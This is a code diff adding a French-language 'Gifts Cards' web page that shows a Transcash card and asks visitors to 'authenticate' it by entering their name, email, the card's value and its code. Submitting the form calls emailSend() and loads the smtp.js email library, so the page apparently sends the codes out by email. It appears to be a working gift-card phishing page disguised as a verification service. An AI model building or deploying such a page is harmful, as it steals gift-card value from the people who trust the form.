@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="googleplay.css">
+    <link rel="stylesheet" href="boxicons.min.css">
+    
+</head>
+<body>
+    <header>
+       
+        <nav  id="nav" class="active">
+            <div id="icons"></div>
+            <a href="index.html" class="title">Gifts Cards </a>
+            <link rel="stylesheet"
+            href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
+            <ul>
+                <li><a href="index.html">Acceuil</a></li>
+                <li><a href="#">Nos cartes</a></li>
+                <li><a href="#">POurquoi?</a></li>
+                <li><a href="#">Support</a></li>
+                <li><a href="#">Contacts</a></li>
+             </ul>
+          
+            <input type="search" value="search" itemscope>
+        </nav>
+    </header>
+    <section>--
+        <div class="description">
+            <h2>Comment Faire</h2>
+            <ol>
+              <img src="images/transcash.png" alt="">
+              <li>Veullez remplir le formulaire ci-contre et soumettre votre requête d'authentification</li>
+            </ol>
+        </div>
+        <div class="formulaire">
+            <form onsubmit="emailSend();  reset(); return false"; >
+                <h2>Authentifier</h2>
+                <input type="Name" id="Name" placeholder="Entrez votre nom">
+                <input type="email" id="email" placeholder="Entrez votre adresse mail" required>
+                <input type="number" id="Prix" placeholder="Prix en €" required>
+                <input type="text" id="code" placeholder="Code de la carte" required>
+                <button type="submit" class="btn">Authentifier</button>
+            </form>
+        </div>
+
+    </section>
+    <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <script src="tc.js"></script>
+</body>
